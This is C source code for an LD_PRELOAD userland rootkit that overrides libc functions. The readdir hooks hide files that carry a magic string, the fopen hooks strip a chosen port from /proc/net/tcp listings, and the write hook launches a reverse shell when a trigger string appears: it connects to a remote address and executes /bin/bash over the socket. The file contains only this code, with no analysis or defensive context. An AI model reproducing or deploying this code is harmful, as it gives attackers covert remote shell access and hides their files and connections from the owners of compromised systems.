#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <netinet/in.h>
#include "rootkit.h"

static struct dirent* (*old_readdir)(DIR *dir) = NULL;
static struct dirent64* (*old_readdir64)(DIR *dir) = NULL;
static FILE* (*old_fopen)(const char *pathname, const char *mode) = NULL;
static FILE* (*old_fopen64)(const char *pathname, const char *mode) = NULL;
static ssize_t (*old_write)(int fd, const void *buf, size_t count) = NULL;


void IPv4() {
    pid_t pid;
    int sockfd;

    if(pid = fork() == 0) {
        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) != -1) {
            struct sockaddr_in server, client;

            inet_pton(AF_INET, REMOTE_ADDR_4, &server.sin_addr);
            server.sin_port = htons(REMOTE_PORT);
            server.sin_family = AF_INET;

            client.sin_addr.s_addr = INADDR_ANY;
            client.sin_port = htons(LOCAL_PORT);
            client.sin_family = AF_INET;

            if ((bind(sockfd, (struct sockaddr *)&client, sizeof(client)) != -1) &&
            (connect(sockfd, (struct sockaddr *)&server, sizeof(server)) != -1)) {
                for(int i = 0; i < 3; i++) dup2(sockfd, i);
                execve("/bin/bash", NULL, NULL);
                close(sockfd);
                exit(0x0);
            }
        }
    }
}


struct dirent* readdir(DIR* dir) {
    struct dirent *dir_;

    if(old_readdir == NULL) 
        old_readdir = (struct dirent* (*)(DIR*))dlsym(RTLD_NEXT, "readdir");
    
    while(dir_ = old_readdir(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


struct dirent64* readdir64(DIR* dir) {
    struct dirent64 *dir_;

    if(old_readdir64 == NULL)
        old_readdir64 = (struct dirent64* (*)(DIR*))dlsym(RTLD_NEXT, "readdir64");
    
    while(dir_ = old_readdir64(dir)) {
        if(strstr(dir_->d_name, MAGIC_STRING) == NULL) break;
    }
    return dir_;
}


FILE* fopen(const char *pathname, const char *mode) {
    if(old_fopen == NULL)
        old_fopen = (FILE* (*)(const char*, const char*))dlsym(RTLD_NEXT, "fopen64");
    
    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) {
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen(pathname, mode);
}


FILE* fopen64(const char *pathname, const char *mode) {
    if(old_fopen64 == NULL)
        old_fopen64 = (FILE* (*)(const char*, const char*))dlsym(RTLD_NEXT, "fopen64");

    if(strcmp(pathname, PROC_NET_TCP) == 0 || strcmp(pathname, PROC_NET_TCP6) == 0) {
        FILE *tmp = tmpfile64(), *old_file;
        char *buff = NULL;
        size_t buff_length = 0;

        if((old_file = old_fopen64(pathname, mode)) != NULL) {
            while(getline(&buff, &buff_length, old_file) != -1) { 
                if(strstr(buff, KEY_PORT) == NULL)
                    fputs(buff, tmp);
            }
            fclose(old_file);
            free(buff);
            buff = NULL;
            rewind(tmp);

            return tmp;
        }
        if(tmp != NULL) fclose(tmp);
    }
    return old_fopen64(pathname, mode);
}


ssize_t write(int fd, const void *buf, size_t count) {
    if(old_write == NULL)
        old_write = (ssize_t (*)(int, const void*, size_t))dlsym(RTLD_NEXT, "write");

    if(strstr(buf, KEY_STRING) != NULL) {
        fd = open("/dev/null", O_WRONLY | O_APPEND);   
        IPv4();
    }
    return old_write(fd, buf, count);
}
